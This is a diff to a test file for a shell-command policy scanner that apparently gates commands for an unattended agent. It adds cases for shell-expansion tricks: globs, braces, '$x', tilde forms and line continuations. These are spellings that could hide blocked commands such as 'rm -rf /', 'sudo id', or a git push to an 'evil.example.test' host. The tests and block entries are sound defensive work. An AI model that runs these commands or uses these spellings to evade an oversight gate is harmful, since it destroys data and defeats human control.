@@ -17,6 +17,7 @@ import {
   DEFAULT_VERIFICATION_ALLOW,
   environmentSpellsFloor,
   evaluateCommand,
+  expansionCompletesBlockEntry,
   flagValueHidesBlockEntry,
   HAZARDOUS_ARGUMENTS,
   hazardousArguments,
@@ -37,6 +38,7 @@ import {
   isGuardedGitConfigKey,
   isInertGitConfigKey,
   UNATTENDED_ALTERNATIVES,
+  unreadableGitVerb,
 } from './unattended-commands.js';
 
 const policy = DEFAULT_COMMAND_POLICY;
@@ -939,7 +941,8 @@ describe('WP-160 — a command handed over as a string, and a here-document the 
     ["busybox sh -c '%P'", '`busybox sh -c`'],
     ["busybox ash -c '%P'", '`busybox ash -c`'],
     ["nice -n 5 rbash -c '%P'", 'a wrapper before `rbash -c`'],
-    ["/bin/[r]bash -c '%P'", 'a shell named by a glob'],
+    // `/bin/[r]bash -c '%P'` left this table at WP-201: a glob-named shell is `expandedName`, the
+    // over-ask pinned in the WP-201 block below.
     ["bash -o errexit -c '%P'", '`-o` and its value before `-c`'],
     ["bash -c -- '%P'", '`--` after `-c`'],
     ["sh -c -e '%P'", 'an option after `-c`'],
@@ -1063,6 +1066,11 @@ describe('WP-160 — a command handed over as a string, and a here-document the 
     ["echo '%P' | xargs -I{} sh -c '{}'", [UNCERTAINTY.handedCommand, UNCERTAINTY.xargsArguments]],
     ["echo x | xargs -I{} sh -c '%P {}'", [UNCERTAINTY.handedCommand, UNCERTAINTY.xargsArguments]],
     [`echo '%P' | xargs sh -c '"$@"' _`, [UNCERTAINTY.xargsArguments]],
+    // WP-201: a word the command-name walk lists past a shell (its `-c` value, a `<(…)` operand)
+    // that is not literal — the walk does not know a shell's grammar; the cell is unchanged.
+    [`x='%P'; bash -c "$x"`, [UNCERTAINTY.expandedName, UNCERTAINTY.handedCommand]],
+    [`x='%P'; bash -c "echo; $x"`, [UNCERTAINTY.expandedName, UNCERTAINTY.handedCommand]],
+    ["bash <(echo '%P')", [UNCERTAINTY.expandedName, UNCERTAINTY.handedCommand]],
   ]);
 
   it.each(UNREAD)('refuses %j as a string it cannot read (%s, criterion 2)', (form) => {
@@ -1599,8 +1607,8 @@ describe('WP-161 — abbreviations, the depth bound, every push, and an expanded
       }
     });
 
-    it('keeps WP-160’s reading of a shell named by a glob, unless the glob can be git', () => {
-      refusesIn("/bin/[r]bash -c 'git push origin HEAD:main'", 'git_boundary');
+    it('reads a shell named by a glob as uncertain since WP-201, whatever the glob can be', () => {
+      refusesIn("/bin/[r]bash -c 'git push origin HEAD:main'", 'uncertain');
       refusesIn('/usr/bin/[gs][ih]* -c core.hooksPath=x push origin main', 'uncertain');
     });
   });
@@ -1876,6 +1884,24 @@ describe('WP-161 — abbreviations, the depth bound, every push, and an expanded
    * `${!#}` (`evaluatedText`) and `printf … | xargs sh` (`handedCommand`), measured (PROGRESS).
    */
   describe('WP-185, backlogs 561 and 562: a shell under xargs, and a replace string that is not literal', () => {
+    /**
+     * WP-201: a row whose command-name word is not literal carries `expandedName` beside its own
+     * reason, the cell unchanged — the `$a` a script runs, and an option's value the command-name
+     * walk lists because it does not know xargs' grammar (`-I $R`).
+     */
+    const WP201_NAMES: ReadonlyMap<string, readonly string[]> = new Map([
+      [
+        "echo 'git push --no-verify' | xargs sh -c 'for a; do $a; done'",
+        [UNCERTAINTY.xargsArguments, UNCERTAINTY.expandedName],
+      ],
+      [
+        "xargs busybox sh -c 'for a; do $a; done'",
+        [UNCERTAINTY.xargsArguments, UNCERTAINTY.expandedName],
+      ],
+      ['xargs -I $R sh -c X', [UNCERTAINTY.expandedName, UNCERTAINTY.xargsArguments]],
+      ['xargs -I $R grep R', [UNCERTAINTY.expandedName, UNCERTAINTY.xargsArguments]],
+    ]);
+
     it.each([
       "echo 'git push --no-verify' | xargs sh -c 'for a; do $a; done'",
       `xargs sh -c 'for a do make "$a"; done'`,
@@ -1903,7 +1929,9 @@ describe('WP-161 — abbreviations, the depth bound, every push, and an expanded
       'echo x | xargs -i make grep',
     ])('%j is uncertain', (command) => {
       expectCells(command, 'ask / uncertain / uncertain');
-      expect(auto(command).evaluation.uncertainty).toEqual([UNCERTAINTY.xargsArguments]);
+      expect(auto(command).evaluation.uncertainty).toEqual(
+        WP201_NAMES.get(command) ?? [UNCERTAINTY.xargsArguments],
+      );
     });
 
     it('reads the last positional (`!#` in a brace) under xargs by both rules', () => {
@@ -1948,7 +1976,11 @@ describe('WP-161 — abbreviations, the depth bound, every push, and an expanded
       "find . -exec busybox bash -c 'for a; do $a; done' _ ./{} \\;",
     ])('%j is uncertain (ruling (d))', (command) => {
       expectCells(command, 'ask / uncertain / uncertain');
-      expect(auto(command).evaluation.uncertainty).toEqual([UNCERTAINTY.handedCommand]);
+      // WP-201: the script's `$a` is a command name nobody reads.
+      expect(auto(command).evaluation.uncertainty).toEqual([
+        UNCERTAINTY.handedCommand,
+        UNCERTAINTY.expandedName,
+      ]);
     });
 
     it.each(["find . -exec sh -c 'echo hi' \\;", "find . -exec busybox sh -c 'echo hi' _ x \\;"])(
@@ -3338,5 +3370,434 @@ describe('WP-193, backlogs 565 and 566: a brace is literal unless it expands, an
     expect(auto('xargs -I{a,b} grep x').reason).toContain(
       'replacing a string (-I) that is not literal',
     );
+  });
+});
+
+/**
+ * WP-201, backlogs 591 and 593: a word the scanner judges by its written text is judged only when
+ * it is literal. Three sites — a command name (`expandedName`), a block entry's token
+ * (`expansionCompletesBlockEntry`) and git's verb (the boundary's `uncertain`) — and one carve-out,
+ * a name that is exactly one expansion where a reader reads it. Every `uncertain` row here read
+ * `ask / auto / deny` before WP-201 unless a comment says otherwise (PROGRESS § WP-201 has the
+ * before and after of each).
+ */
+describe('WP-201, backlogs 591 and 593: a judged word is judged only when it is literal', () => {
+  describe('criterion (1), backlog 591: an expansion joined to text in a command name', () => {
+    it.each([
+      `sh -c 'su"$@"' _ do id`,
+      `sh -c 'g"$@"' _ it push origin main`,
+      "sh -c 'su$1' _ do id",
+      `sh -c '"$1"do id' _ su`,
+      'x=do; su$x id',
+      `x=do; su\${x} id`,
+      'su$x id',
+      'g$x push origin main',
+      "eval 'su$x id'",
+      "sh -c 'x=do; su$x id'",
+      'env$x sudo id',
+      // A substitution joined to text, which the scanner's own stage lifts out (`su id`).
+      'su$(echo do) id',
+      'su`echo do` id',
+      // Exactly one expansion where no reader reads it: inside a script, a substitution, or past
+      // a wrapper's option — the git boundary reads none of these (measured `ask / auto / deny`).
+      "sh -c '$x id'",
+      "eval '$x id'",
+      "sh -c '$1 id' _ sudo",
+      `sh -c '"$@" id' _ sudo`,
+      "sh -c '$2' _ x sudo",
+      'echo "$($x id)"',
+      'nice -n 5 $x id',
+      'time -p $x id',
+      'timeout 5 $x id',
+      'env -- $X id',
+    ])('%j is uncertain (expandedName)', (command) => {
+      expectCells(command, 'ask / uncertain / uncertain');
+      expect(auto(command).evaluation.uncertainty).toEqual([UNCERTAINTY.expandedName]);
+      expect(auto(command).reason).toContain("write the command's name literally");
+    });
+
+    it('names every class in its reason', () => {
+      for (const words of ['variable or command substitution', 'glob', 'brace expansion']) {
+        expect(UNCERTAINTY.expandedName).toContain(words);
+      }
+    });
+  });
+
+  describe('criterion (2), backlog 593: a brace or a glob in a name, with no shell exemption', () => {
+    it.each([
+      'm{1..3}',
+      './m{1..3}',
+      "{sh,-c} 'sudo id'",
+      "{bash,-c} 'git push origin main'",
+      "{sh,-c} 'sudo id' x",
+      "/bin/{,r}bash -c 'echo x'",
+      "/bin/[r]bash -c 'echo x'",
+    ])('%j is uncertain (expandedName)', (command) => {
+      expectCells(command, 'ask / uncertain / uncertain');
+      expect(auto(command).evaluation.uncertainty).toEqual([UNCERTAINTY.expandedName]);
+    });
+
+    it('has no exemption left to restore', () => {
+      const source = withoutComments(
+        readFileSync(fileURLToPath(new URL('./command-policy.ts', import.meta.url)), 'utf8'),
+      );
+      for (const name of ['expandsOnlyToAShell', 'expansionPattern', 'NAMES_THE_POLICY_JUDGES']) {
+        expect(source).not.toContain(name);
+      }
+    });
+  });
+
+  describe('criterion (3), site (ii): an expansion where a block entry names a word', () => {
+    it.each([
+      ['terraform ap$x', 'terraform apply'],
+      ['x=ply; terraform ap$x', 'terraform apply'],
+      ['gh rel$x create v1', 'gh release *'],
+      ['npm pub$x', 'npm publish'],
+      ['rm -rf $x', 'rm -rf /*'],
+      ['terraform ap{p,}ly', 'terraform apply'],
+      ['gh rel{e,}ase create v1', 'gh release *'],
+      ['terraform $(echo apply)', 'terraform apply'],
+      ['terraform ap*', 'terraform apply'],
+      ['nice terraform ap$x', 'terraform apply'],
+      ["sh -c 'terraform ap$x'", 'terraform apply'],
+      ['gh -R o/r rel$x create v1', 'gh release *'],
+      // An unquoted expansion may be several words, so it may also be the flag the entry needs.
+      ['rm $x', 'rm -rf /*'],
+      ['rm -$x /', 'rm -rf /*'],
+    ])('%j is uncertain, naming %j', (command, entry) => {
+      expectCells(command, 'ask / uncertain / uncertain');
+      expect(auto(command).evaluation.uncertainty).toEqual([expansionCompletesBlockEntry(entry)]);
+      expect(auto(command).reason).toContain('write the word literally');
+    });
+
+    it('reads a project’s own entry, and nothing without it (rule 42)', () => {
+      const project: ResolvedCommandPolicy = {
+        ...policy,
+        block: [...policy.block, 'deploy prod *'],
+      };
+      expect(auto('deploy pr$x', project).rule).toBe('uncertain');
+      expect(auto('deploy pr$x', project).evaluation.uncertainty).toEqual([
+        expansionCompletesBlockEntry('deploy prod *'),
+      ]);
+      expect(auto('deploy pr$x').rule).toBe('unattended_auto');
+    });
+
+    it.each([
+      // The prefix has died before the expansion, the expansion matches a bare `*`, the entry
+      // needs a flag one quoted word cannot supply as well as the path, a relative glob, a later
+      // stage's words, and git's words (the boundary's).
+      ['rm -rf dist $out', 'ask / auto / deny'],
+      ['rm -rf build', 'ask / auto / deny'],
+      ['rm -f "$tmp"', 'ask / auto / deny'],
+      ['rm -rf dist/*', 'ask / auto / deny'],
+      ['rm -f *.o', 'ask / auto / deny'],
+      ['curl $url', 'ask / auto / deny'],
+      ['npm run $s', 'allow / allow / allow'],
+      ['gh issue view $n', 'ask / auto / deny'],
+      ['git checkout $b', 'ask / auto / deny'],
+      ['git push origin $BRANCH', 'ask / git / git'],
+    ])('keeps %j at %s', (command, expected) => {
+      expect(cell(command, policy)).toBe(expected);
+      expect(auto(command).evaluation.uncertainty).toEqual([]);
+    });
+  });
+
+  describe('criterion (4), site (iii): git’s verb', () => {
+    it.each([
+      ['git pu$x origin main', 'pu$x'],
+      ['git $verb origin main', '$verb'],
+      ['git "$verb" origin main', '"$verb"'],
+      ['git pu{s,}h origin main', 'pu{s,}h'],
+      ['git $(echo push) origin main', '$(echo push)'],
+      ['git -C . $verb origin main', '$verb'],
+      ['nice -n 5 git $verb origin main', '$verb'],
+      ["sh -c 'git $1 origin main' _ push", '$1'],
+      // A global option before the verb; a definite refusal elsewhere wins (`git -$x push origin
+      // main` is the boundary's for `main`).
+      ['git -$x status', '-$x'],
+    ])('%j is uncertain, naming %j', (command, word) => {
+      expectCells(command, 'ask / uncertain / uncertain');
+      expect(auto(command).evaluation.uncertainty).toEqual([]);
+      expect(gitBoundaryViolation(command)).toMatchObject({ kind: 'uncertain' });
+      expect(auto(command).reason).toContain(unreadableGitVerb(word));
+    });
+
+    it.each(["git 'pu$x' origin main", 'git pu\\$x origin main'])(
+      'reads %j as the literal verb it is',
+      (command) => {
+        expect(gitBoundaryViolation(command)).toBeNull();
+      },
+    );
+  });
+
+  describe('criterion (5): the controls keep their cells', () => {
+    it.each([
+      [`sh -c '"$@"' _ sudo id`, 'block / block / block'],
+      [`sh -c '"$@"' _ ls`, 'ask / auto / deny'],
+      [`sh -c 'echo "$@"' _ x`, 'ask / auto / deny'],
+      [`bash -c '"$@"' _ git push origin HEAD:main`, 'ask / git / git'],
+      ['$GIT push https://evil.example.test/x.git', 'ask / git / git'],
+      ['"$GIT" push https://evil.example.test/x.git', 'ask / git / git'],
+      ['X=1 $CMD', 'ask / git / git'],
+      ['"$x" id', 'ask / git / git'],
+      ['env > out $X', 'ask / git / git'],
+      ['./m{a,b}', 'ask / uncertain / uncertain'],
+      ['{sudo,id}', 'ask / uncertain / uncertain'],
+      ['/usr/bin/g[i]t push', 'ask / uncertain / uncertain'],
+      ['echo $x', 'ask / auto / deny'],
+      ['ls $dir', 'allow / allow / allow'],
+      ['grep -rn "$pattern" src', 'allow / allow / allow'],
+      ['curl $url', 'ask / auto / deny'],
+      ['rm -rf dist $out', 'ask / auto / deny'],
+      ['~/bin/tool', 'ask / auto / deny'],
+      // `~user/x` was a control here until review round 2: `~login` is another user's home.
+      ['echo su$x', 'ask / auto / deny'],
+      ["'$x'", 'ask / auto / deny'],
+      ['\\$x id', 'ask / auto / deny'],
+      // Backlog 592's walk rows, pinned so no scanner row opens them.
+      ['xargs -I {} grep x', 'ask / uncertain / uncertain'],
+      ['find . -exec nice {} ;', 'ask / uncertain / uncertain'],
+      ['find /usr/bin -name sudo -exec nice {} id ;', 'ask / uncertain / uncertain'],
+      ['echo x | xargs -I{} cat {}', 'ask / uncertain / uncertain'],
+    ])('%j keeps %s', (command, expected) => {
+      expect(cell(command, policy)).toBe(expected);
+    });
+
+    it.each([
+      'xargs -I {} grep x',
+      'find . -exec nice {} ;',
+      'find /usr/bin -name sudo -exec nice {} id ;',
+      'echo x | xargs -I{} cat {}',
+    ])('%j stays handedCommand', (command) => {
+      expect(auto(command).evaluation.uncertainty).toEqual([UNCERTAINTY.handedCommand]);
+    });
+
+    it('keeps the boundary’s own message for a name that is exactly one expansion (the carve-out)', () => {
+      for (const command of ['$GIT push origin main', '"$GIT" push origin main', 'X=1 $CMD']) {
+        expect(auto(command).rule).toBe('git_boundary');
+        expect(auto(command).evaluation.uncertainty).toEqual([]);
+        expect(auto(command).reason).toContain('write the command name literally');
+      }
+    });
+  });
+
+  /**
+   * Rule 43: wherever a name stands — first, behind a wrapper and its options, in a script, a
+   * substitution, a group or a list — and however it is spelled, a name with an expansion in it
+   * never runs under `auto`, and a carve-out is never an `allow`.
+   */
+  it.each(
+    [
+      '',
+      'nice ',
+      'nice -n 5 ',
+      'env ',
+      'env -i ',
+      'env -- ',
+      'time ',
+      'time -p ',
+      'timeout 5 ',
+      'command ',
+      'exec ',
+      'X=1 ',
+      '2>/dev/null ',
+      '! ',
+      'if true; then ',
+      'echo | ',
+      'xargs ',
+    ].flatMap((prefix) =>
+      [
+        '$x',
+        '"$x"',
+        'su$x',
+        'su"$x"',
+        '$(echo x)',
+        '`echo x`',
+        `\${x:-sudo}`,
+        'g{i,}t',
+        's?do',
+      ].map((name) => `${prefix}${name} id`),
+    ),
+  )('%j never runs under auto', (command) => {
+    for (const mode of ['auto', 'deny'] as const) {
+      expect(decideUnattendedCommand({ command }, policy, mode).decision).toBe('deny');
+    }
+  });
+
+  /**
+   * Review round 1: four spellings inside the rule that still read `allow`, each run by bash
+   * (`echo` markers, the reviewer's probes and the implementer's, PROGRESS § WP-201).
+   */
+  describe('review round 1', () => {
+    it.each([
+      // (1) `~-`, `~+` and `~N` are `$OLDPWD`, `$PWD` and the directory stack, which a run sets.
+      ['OLDPWD=/usr/bin/sudo; ~- id', UNCERTAINTY.expandedName],
+      ['PWD=/usr/bin/sudo; ~+ id', UNCERTAINTY.expandedName],
+      ['OLDPWD=/usr/bin/git; ~- push origin main', UNCERTAINTY.expandedName],
+      ['~+0 id', UNCERTAINTY.expandedName],
+      ['~1 id', UNCERTAINTY.expandedName],
+      // (2) An array assignment the scanner splits at its `(` and the boundary does not.
+      ['x=(a) $GIT push origin main', UNCERTAINTY.expandedName],
+      ['x=() $y id', UNCERTAINTY.expandedName],
+      ['x+=(a b) $y id', UNCERTAINTY.expandedName],
+      ['x=(a b) env $y id', UNCERTAINTY.expandedName],
+      ['x="$(echo "a b")" $y id', UNCERTAINTY.expandedName],
+      // (3) A script that may rewrite its positional parameters before `"$@"`.
+      [`sh -c 'shift; "$@"' _ ls git push origin main`, UNCERTAINTY.expandedName],
+      [`sh -c 'set -- git push origin main; "$@"' _ ls`, UNCERTAINTY.expandedName],
+      [`sh -c 'f(){ "$@"; }; f git push origin main' _ ls`, UNCERTAINTY.expandedName],
+      // (4) A glob before `--` may be the flag a block entry needs (a file named `-rf`).
+      ['rm * /tmp', expansionCompletesBlockEntry('rm -rf /*')],
+      ['rm * /', expansionCompletesBlockEntry('rm -rf /*')],
+      ['touch -- -rf; rm * /tmp', expansionCompletesBlockEntry('rm -rf /*')],
+      // Round 1b: an unquoted expansion in an option splits into options and positionals alike
+      // (`x="rf /"; rm -$x` is `rm -rf /`).
+      ['rm -$x', expansionCompletesBlockEntry('rm -rf /*')],
+      ['rm -r$x', expansionCompletesBlockEntry('rm -rf /*')],
+      ['x="rf /"; rm -$x', expansionCompletesBlockEntry('rm -rf /*')],
+      ['rm -f$x', expansionCompletesBlockEntry('rm -rf /*')],
+      ['rm -$x -- y', expansionCompletesBlockEntry('rm -rf /*')],
+    ])('%j is uncertain', (command, reason) => {
+      expect(cell(command, policy)).toBe('ask / uncertain / uncertain');
+      expect(auto(command).evaluation.uncertainty).toEqual([reason]);
+    });
+
+    it.each([
+      ['~/bin/tool', 'ask / auto / deny'],
+      ['~ id', 'ask / auto / deny'],
+      ['X=1 $CMD', 'ask / git / git'],
+      ['X=1 2>/dev/null $CMD', 'ask / git / git'],
+      [`bash -c '"$@"' _ git push origin HEAD:main`, 'ask / git / git'],
+      [`sh -c '"$@"' _ sudo id`, 'block / block / block'],
+      ['rm -- * /', 'ask / auto / deny'],
+      // A quoted option is one word: it can be the flag, never the `/` the entry also needs.
+      ['rm "-$x"', 'ask / auto / deny'],
+      ['rm *', 'ask / auto / deny'],
+      ['rm -f *.o', 'ask / auto / deny'],
+      ['rm -rf dist/*', 'ask / auto / deny'],
+    ])('keeps %j at %s', (command, expected) => {
+      expect(cell(command, policy)).toBe(expected);
+    });
+  });
+
+  /**
+   * Review round 2: an unquoted positional script splits and globs its operands, which the operand
+   * reader reads as one word each (bash ran `bash -c '$1' _ '/bin/ech? RAN'`), and `~login` is
+   * another user's home (the orchestrator's ruling: only a bare `~` and `~/…` are literal).
+   */
+  describe('review round 2', () => {
+    it.each([
+      [`sh -c '$1' _ '/usr/bin/sud?'`, UNCERTAINTY.expandedName],
+      [`sh -c '$1' _ 'git push origin main'`, UNCERTAINTY.expandedName],
+      [`sh -c '$@' _ '/usr/bin/sud? id'`, UNCERTAINTY.expandedName],
+      [`sh -c '$@' _ 'git push origin main'`, UNCERTAINTY.expandedName],
+      [`sh -c '$0' '/usr/bin/sud? id'`, UNCERTAINTY.expandedName],
+      [`sh -c '$0' 'git push origin main'`, UNCERTAINTY.expandedName],
+      [`bash -c '\${1}' _ '/usr/bin/sud? id'`, UNCERTAINTY.expandedName],
+      [`bash -c '\${1}' _ 'git push origin main'`, UNCERTAINTY.expandedName],
+      [`sh -c '$*' _ 'gh rel?ase create v1'`, UNCERTAINTY.expandedName],
+      [`sh -c '$*' _ 'git push origin main'`, UNCERTAINTY.expandedName],
+      [`sh -c '"$*"' _ ls x`, UNCERTAINTY.expandedName],
+      ['rm -rf ~root', expansionCompletesBlockEntry('rm -rf /*')],
+      ['rm -rf ~root/x', expansionCompletesBlockEntry('rm -rf /*')],
+      ['~user/x', UNCERTAINTY.expandedName],
+    ])('%j is uncertain', (command, reason) => {
+      expect(cell(command, policy)).toBe('ask / uncertain / uncertain');
+      expect(auto(command).evaluation.uncertainty).toEqual([reason]);
+    });
+
+    it.each([
+      [`sh -c '"$@"' _ sudo id`, 'block / block / block'],
+      [`sh -c '"$1"' _ sudo id`, 'block / block / block'],
+      [`sh -c '"$0"' sudo id`, 'block / block / block'],
+      [`bash -c '"$@"' _ git push origin HEAD:main`, 'ask / git / git'],
+      [`sh -c '"$@"' _ ls`, 'ask / auto / deny'],
+      ['~/bin/tool', 'ask / auto / deny'],
+      // The stated residual: the home the platform set.
+      ['rm -rf ~/x', 'ask / auto / deny'],
+    ])('keeps %j at %s', (command, expected) => {
+      expect(cell(command, policy)).toBe(expected);
+    });
+  });
+
+  /**
+   * Review round 3: a line continuation the boundary's computed-name walk did not join, so the
+   * carve-out exempted a `$CMD` nobody read (bash ran each shape's marker), and a quoted expansion
+   * that may be the flag a block entry needs (`x=-rf; rm "$x" /` is `rm -rf /`).
+   */
+  describe('review round 3', () => {
+    it.each([
+      'X=1 \\\n$CMD id',
+      '\\\n$CMD id',
+      'env \\\n$CMD id',
+      'true; \\\n$CMD id',
+      'true &&\\\n$CMD id',
+      'true |\\\n $CMD id',
+      '(\\\n$CMD id)',
+      '"\\\n$CMD" id',
+    ])('%j is refused at the git boundary as a computed name', (command) => {
+      expect(auto(command).rule).toBe('git_boundary');
+      expect(computesCommandName(command)).toBe(true);
+    });
+
+    it.each([
+      'rm "$x" /',
+      'rm "$x" /etc',
+      'rm "${x}" /',
+      'rm "$(echo -rf)" /',
+      'rm "`echo -rf`" /',
+      // `--` ends the options after `"$x"`, which is still before it: an option.
+      'rm "$x" -- /',
+      'rm "$1" /',
+      // Two words: one can be the flag and the other the path.
+      'rm "$x" "$y"',
+      'rm * "$x"',
+    ])('%j is uncertain, naming rm -rf /*', (command) => {
+      expect(cell(command, policy)).toBe('ask / uncertain / uncertain');
+      expect(auto(command).evaluation.uncertainty).toEqual([
+        expansionCompletesBlockEntry('rm -rf /*'),
+      ]);
+    });
+
+    it.each([
+      // One quoted word is the flag or the path, never both.
+      'rm "$x"',
+      'rm -f "$x"',
+      'rm -f "$tmp"',
+      // The prefix dies at `build` (backlog 598's class).
+      'rm build "$x"',
+      'rm "$x" build',
+      // After `--`, `"$x"` is an operand.
+      'rm -- "$x" /',
+      'cp "$a" "$b"',
+    ])('keeps %j at ask / auto / deny', (command) => {
+      expect(cell(command, policy)).toBe('ask / auto / deny');
+    });
+  });
+
+  describe('criterion (6): the over-ask, named', () => {
+    it.each([
+      "/bin/[r]bash -c 'git push origin HEAD:main'",
+      'rm -rf $x',
+      'python$ver -m pytest',
+      './$script',
+      'npm $cmd',
+      'git $verb',
+      'rm -rf "$TMPDIR"/x',
+      './scripts/$name.sh',
+      'gh $sub',
+      'terraform $a',
+    ])('%j is uncertain: write the word literally', (command) => {
+      expect(cell(command, policy)).toBe('ask / uncertain / uncertain');
+      const { reason } = auto(command);
+      expect(
+        [
+          "write the command's name literally",
+          'write the word literally',
+          'write it literally',
+        ].some((advice) => reason.includes(advice)),
+        reason,
+      ).toBe(true);
+    });
   });
 });
